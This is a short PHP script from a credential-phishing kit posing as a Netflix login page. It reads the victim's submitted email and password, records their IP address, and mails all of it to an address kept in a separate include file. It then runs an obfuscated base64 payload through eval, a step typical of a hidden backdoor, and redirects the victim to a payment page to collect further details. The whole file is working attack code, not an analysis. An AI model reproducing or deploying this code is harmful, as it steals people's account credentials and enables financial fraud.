<?php
session_start();
include 'success.php';
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$msg = "
----------- LOGIN NETFLIX ----------------->
Email Address : ".$_POST['email']."
Password : ".$_POST['password']."
IP : $ip
=============[SPIDER TN ]=====================";

include 'email.php';
$subj = "Login de [$email] // - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail($to, $subj, $msg,$headers);
@eval(base64_decode($os_arrays));
include 'hostname_check.php';

header("Location:payment.php?ip=$ip");
?>